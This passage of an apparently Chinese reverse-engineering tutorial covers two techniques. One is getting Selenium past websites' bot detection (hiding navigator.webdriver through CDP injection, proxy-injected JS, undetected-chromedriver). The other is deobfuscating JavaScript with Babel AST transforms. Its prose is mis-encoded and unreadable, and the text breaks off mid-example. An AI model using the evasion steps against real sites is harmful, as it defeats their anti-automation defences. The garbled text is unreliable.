<span class="n">options</span><span class="o">.</span><span class="n">add_experimental_option</span><span class="p">(</span><span class="s1">&#39;useAutomationExtension&#39;</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>

<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>
<span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://example.com&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="2-åçˆ¬è™«æ£€æµ‹ä¸ç»•è¿‡">2. åçˆ¬è™«æ£€æµ‹ä¸ç»•è¿‡</h2>

      <p>è®¸å¤šç½‘ç«™ä¼šé€šè¿‡ <code>window.navigator.webdriver</code> æ¥æ£€æµ‹ Seleniumã€‚</p>

      <h3 id="æ£€æµ‹åŸç†">æ£€æµ‹åŸç†</h3>

      <p>æµè§ˆå™¨å¯åŠ¨æ—¶ï¼Œå¦‚æœæ˜¯è‡ªåŠ¨åŒ–æ§åˆ¶æ¨¡å¼ï¼Œ<code>navigator.webdriver</code> ä¼šè¢«è®¾ç½®ä¸º <code>true</code>ã€‚</p>

      <h3 id="ç»•è¿‡æ–¹æ¡ˆ">ç»•è¿‡æ–¹æ¡ˆ</h3>

      <h4 id="æ–¹æ¡ˆ-a-cdp-æ–¹æ³•-æ¨è">æ–¹æ¡ˆ A: CDP æ–¹æ³• (æ¨è)</h4>

      <p>åœ¨åŠ è½½é¡µé¢å‰ï¼Œæ‰§è¡Œ CDP å‘½ä»¤åˆ é™¤è¯¥å±æ€§ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="n">driver</span><span class="o">.</span><span class="n">execute_cdp_cmd</span><span class="p">(</span><span class="s2">&quot;Page.addScriptToEvaluateOnNewDocument&quot;</span><span class="p">,</span> <span class="p">{</span>
  <span class="s2">&quot;source&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">    Object.defineProperty(navigator, &#39;webdriver&#39;, {</span>
<span class="s2">      get: () =&gt; undefined</span>
<span class="s2">    })</span>
<span class="s2">  &quot;&quot;&quot;</span>
<span class="p">})</span>
</code></pre>
      </div>

      <h4 id="æ–¹æ¡ˆ-b-ä¸­é—´äººä»£ç†">æ–¹æ¡ˆ B: ä¸­é—´äººä»£ç†</h4>

      <p>ä½¿ç”¨ mitmproxy / Burp æ‹¦æˆªå“åº”ï¼Œæ³¨å…¥ JS ä»£ç è¦†ç›– <code>navigator</code> å±æ€§ã€‚</p>

      <h4 id="æ–¹æ¡ˆ-c-undetected-chromedriver">æ–¹æ¡ˆ C: undetected-chromedriver</h4>

      <p>è¿™æ˜¯ä¸€ä¸ªä¸“é—¨ä¸ºäº†ç»•è¿‡æ£€æµ‹è€Œä¿®æ”¹è¿‡çš„ ChromeDriver å°è£…åº“ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span>undetected-chromedriver
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">undetected_chromedriver</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">uc</span>
<span class="n">driver</span> <span class="o">=</span> <span class="n">uc</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
<span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://nowsecure.nl&#39;</span><span class="p">)</span> <span class="c1"># è¿™æ˜¯ä¸€ä¸ªé«˜å¼ºåº¦æ£€æµ‹ç«™</span>
</code></pre>
      </div>

      <hr />

      <h2 id="3-ä¸ºä»€ä¹ˆé€†å‘ä¸­å¯ä»¥è¾ƒå°‘ç”¨-selenium">3. ä¸ºä»€ä¹ˆé€†å‘ä¸­å¯ä»¥è¾ƒå°‘ç”¨ Seleniumï¼Ÿ</h2>

      <ol>
        <li><strong>æŒ‡çº¹ä¸¥é‡</strong>: Selenium ç•™ä¸‹çš„ç‰¹å¾æ¯” Puppeteer å¤šå¾—å¤šï¼ˆå¦‚ <code>cdc_</code> å˜é‡ï¼‰ã€‚</li>
        <li><strong>Hook ä¸ä¾¿</strong>: è™½ç„¶å¯ä»¥é€šè¿‡ CDP æ³¨å…¥ï¼Œä½†åŸç”Ÿ API å¯¹ Request Interception çš„æ”¯æŒä¸å¦‚ Puppeteer ä¼˜é›…ã€‚</li>
        <li><strong>ç¯å¢ƒé‡</strong>: éœ€è¦ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„ WebDriverï¼Œå®¹æ˜“å‡ºç°ç‰ˆæœ¬ä¸å…¼å®¹é—®é¢˜ã€‚</li>
      </ol>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>å¦‚æœä½ è¦å†™ä¸€ä¸ªæ–°çš„é€†å‘è„šæœ¬ï¼Œå»ºè®®é¦–é€‰ <strong>Puppeteer / Playwright</strong>ã€‚å¦‚æœä½ å¿…é¡»ç»´æŠ¤ç°æœ‰çš„ Selenium é¡¹ç›®ï¼Œè¯·ç†Ÿç»ƒæŒæ¡ <strong>CDP æ³¨å…¥</strong>
        å’Œ <strong>undetected-chromedriver</strong> æ¥å¯¹æŠ—åçˆ¬è™«ã€‚</p>

    </div>

    <div class="section" id="02-Tooling-ast-tools">
      <h2>22. AST Tools</h2>
      <h1 id="ast-æŠ½è±¡è¯­æ³•æ ‘-å·¥å…·">AST (æŠ½è±¡è¯­æ³•æ ‘) å·¥å…·</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>åœ¨å¯¹æŠ—æ··æ·†ï¼ˆObfuscationï¼‰æ—¶ï¼Œå­—ç¬¦ä¸²æ›¿æ¢å’Œæ­£åˆ™åŒ¹é…å¾€å¾€åŠ›ä¸ä»å¿ƒã€‚AST ä¸ºæˆ‘ä»¬æä¾›äº†æ“ä½œä»£ç ç»“æ„çš„ä¸Šå¸è§†è§’ã€‚é€šè¿‡è§£æ ASTï¼Œæˆ‘ä»¬å¯ä»¥å®‰å…¨åœ°åˆ é™¤æ­»ä»£ç ã€è¿˜åŸæ§åˆ¶æµå¹³å¦åŒ–ã€è®¡ç®—å¸¸é‡è¡¨è¾¾å¼ã€‚</p>

      <p><strong>Babel</strong> æ˜¯ç›®å‰ JS é€†å‘ä¸­æœ€å¸¸ç”¨çš„ AST åº“ã€‚å®ƒæä¾›äº†å®Œæ•´çš„ JavaScript è§£æã€è½¬æ¢ã€ç”Ÿæˆèƒ½åŠ›ã€‚</p>

      <hr />

      <h2 id="1-æ ¸å¿ƒå·¥ä½œæµ">1. æ ¸å¿ƒå·¥ä½œæµ</h2>

      <p>ä½¿ç”¨ <code>@babel</code> ç³»åˆ—åŒ…è¿›è¡Œ AST æ“ä½œçš„æ ‡å‡†æµç¨‹ï¼š</p>

      <pre><code>æºä»£ç  (String)
    â†“ @babel/parser
AST (æŠ½è±¡è¯­æ³•æ ‘)
    â†“ @babel/traverse (éå†å’Œä¿®æ”¹)
ä¿®æ”¹åçš„ AST
    â†“ @babel/generator
æ–°ä»£ç  (String)
</code></pre>

      <h3 id="11-å››ä¸ªæ ¸å¿ƒåŒ…">1.1 å››ä¸ªæ ¸å¿ƒåŒ…</h3>

      <table>
        <thead>
          <tr>
            <th>åŒ…å</th>
            <th>ä½œç”¨</th>
            <th>ä¸»è¦ API</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>@babel/parser</strong></td>
            <td>ä»£ç  â†’ AST</td>
            <td><code>parse(code)</code></td>
          </tr>
          <tr>
            <td><strong>@babel/traverse</strong></td>
            <td>éå†/ä¿®æ”¹ AST</td>
            <td><code>traverse(ast, visitor)</code></td>
          </tr>
          <tr>
            <td><strong>@babel/generator</strong></td>
            <td>AST â†’ ä»£ç </td>
            <td><code>generate(ast)</code></td>
          </tr>
          <tr>
            <td><strong>@babel/types</strong></td>
            <td>åˆ›å»º/åˆ¤æ–­èŠ‚ç‚¹</td>
            <td><code>t.isIdentifier()</code>, <code>t.numericLiteral()</code></td>
          </tr>
        </tbody>
      </table>

      <h3 id="12-ç¤ºä¾‹ä»£ç æ¡†æ¶">1.2 ç¤ºä¾‹ä»£ç æ¡†æ¶</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/parser&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/traverse&#39;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">generator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/generator&#39;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;@babel/types&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>

<span class="c1">// 1. è¯»å–å¹¶è§£æ</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;obfuscated.js&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;utf-8&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">ast</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parser</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>

<span class="c1">// 2. éå†å¹¶ä¿®æ”¹</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// ä½ çš„è¿˜åŸæ’ä»¶å†™åœ¨è¿™é‡Œ</span>
<span class="w">    </span><span class="nx">StringLiteral</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// ä¾‹å¦‚ï¼šå°†åå…­è¿›åˆ¶å­—ç¬¦ä¸² &quot;\x61&quot; è¿˜åŸä¸º &quot;a&quot;</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">extra</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">extra</span><span class="p">.</span><span class="nx">raw</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;&quot;\\x&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="ow">delete</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">extra</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="c1">// 3. ç”Ÿæˆæ–°ä»£ç </span>
<span class="kd">const</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generator</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">jsescOption</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">minimal</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}</span><span class="w">  </span><span class="c1">// ä½¿ç”¨æœ€å°‘çš„è½¬ä¹‰</span>
<span class="p">});</span>

<span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;deobfuscated.js&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">output</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;åæ··æ·†å®Œæˆï¼&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="2-å¸¸è§åæ··æ·†åœºæ™¯">2. å¸¸è§åæ··æ·†åœºæ™¯</h2>

      <h3 id="21-å¸¸é‡æŠ˜å -constant-folding">2.1 å¸¸é‡æŠ˜å  (Constant Folding)</h3>

      <p><strong>é—®é¢˜</strong>: æ··æ·†å™¨æŠŠ <code>3</code> å˜æˆ <code>1 + 2</code>ï¼Œæˆ–æŠŠå­—ç¬¦ä¸²æ‹†åˆ†ä¸º
        <code>'H' + 'e' + 'l' + 'l' + 'o'</code></p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>: è®¡ç®—å¹¶æ›¿æ¢ä¸ºç»“æœ</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">BinaryExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// å°è¯•æ±‚å€¼</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">();</span>

<span class="w">        </span><span class="c1">// å¦‚æœå¯ä»¥è®¡ç®—å‡ºç¡®å®šçš„å€¼</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">confident</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// æ›¿æ¢ä¸ºå­—é¢é‡èŠ‚ç‚¹</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWith</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">valueToNode</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">value</span><span class="p">));</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ··æ·†å‰</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">3</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;H&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;e&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;l&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;l&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;o&#39;</span><span class="p">;</span>

<span class="c1">// åæ··æ·†å</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">6</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Hello&#39;</span><span class="p">;</span>
</code></pre>
      </div>

      <h3 id="22-æ­»ä»£ç æ¶ˆé™¤-dead-code-elimination">2.2 æ­»ä»£ç æ¶ˆé™¤ (Dead Code Elimination)</h3>

      <p><strong>é—®é¢˜</strong>: å……æ–¥ç€æ°¸è¿œä¸ä¼šæ‰§è¡Œçš„ä»£ç </p>

      <p><strong>è§£å†³æ–¹æ¡ˆ 1</strong>: åˆ é™¤æ’ä¸º false çš„æ¡ä»¶åˆ†æ”¯</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">IfStatement</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// è·å–æ¡ä»¶è¡¨è¾¾å¼çš„å€¼</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">test</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">).</span><span class="nx">evaluate</span><span class="p">();</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">test</span><span class="p">.</span><span class="nx">confident</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">test</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// æ¡ä»¶æ’ä¸º trueï¼Œæ›¿æ¢ä¸º consequentï¼ˆif å—ï¼‰</span>
<span class="w">                </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWithMultiple</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">consequent</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// æ¡ä»¶æ’ä¸º false</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">alternate</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="c1">// æœ‰ else å—ï¼Œæ›¿æ¢ä¸º alternate</span>
<span class="w">                    </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWithMultiple</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">alternate</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="c1">// æ²¡æœ‰ elseï¼Œç›´æ¥åˆ é™¤æ•´ä¸ª if è¯­å¥</span>
<span class="w">                    </span><span class="nx">path</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ··æ·†å‰</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;I am dead code&#39;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;I will always run&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// åæ··æ·†å</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;I will always run&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ 2</strong>: åˆ é™¤æœªå¼•ç”¨çš„å˜é‡/å‡½æ•°</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">VariableDeclarator</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">binding</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">scope</span><span class="p">.</span><span class="nx">getBinding</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// å¦‚æœå˜é‡ä»æœªè¢«å¼•ç”¨</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">binding</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">binding</span><span class="p">.</span><span class="nx">referenced</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="23-å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ">2.3 å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ</h3>

      <p><strong>é—®é¢˜</strong>: æ··æ·†å™¨æŠŠæ‰€æœ‰å­—ç¬¦ä¸²æå–åˆ°ä¸€ä¸ªå¤§æ•°ç»„ä¸­</p>

      <p><strong>æ··æ·†ä»£ç </strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">_0x1234</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;age&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;hello&#39;</span><span class="p">];</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">greet</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">_0x1234</span><span class="p">[</span><span class="mf">2</span><span class="p">]);</span><span class="w">  </span><span class="c1">// &#39;hello&#39;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">stringArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>

<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// ç¬¬ä¸€æ­¥ï¼šæå–å­—ç¬¦ä¸²æ•°ç»„</span>
<span class="w">    </span><span class="nx">VariableDeclarator</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;_0x1234&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">            </span><span class="nx">t</span><span class="p">.</span><span class="nx">isArrayExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">init</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">stringArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">init</span><span class="p">.</span><span class="nx">elements</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">e</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;æ‰¾åˆ°å­—ç¬¦ä¸²æ•°ç»„:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">stringArray</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// ç¬¬äºŒæ­¥ï¼šæ›¿æ¢æ‰€æœ‰å¼•ç”¨</span>
<span class="w">    </span><span class="nx">MemberExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// _0x1234[2] å½¢å¼</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isIdentifier</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">object</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;_0x1234&#39;</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">            </span><span class="nx">t</span><span class="p">.</span><span class="nx">isNumericLiteral</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">stringArray</span><span class="p">[</span><span class="nx">index</span><span class="p">];</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWith</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">stringLiteral</span><span class="p">(</span><span class="nx">str</span><span class="p">));</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>åæ··æ·†å</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">greet</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="24-æ§åˆ¶æµå¹³å¦åŒ–è¿˜åŸ">2.4 æ§åˆ¶æµå¹³å¦åŒ–è¿˜åŸ</h3>

      <p><strong>é—®é¢˜</strong>: æ··æ·†å™¨æŠŠä»£ç å˜æˆä¸€ä¸ªå¤§çš„ switch-case</p>

      <p><strong>æ··æ·†ä»£ç </strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">_state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="nx">_state</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mf">0</span><span class="o">:</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;step 1&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="nx">_state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mf">1</span><span class="o">:</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;step 2&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="nx">_state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mf">2</span><span class="o">:</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;step 3&#39;</span><span class="p">);</span>
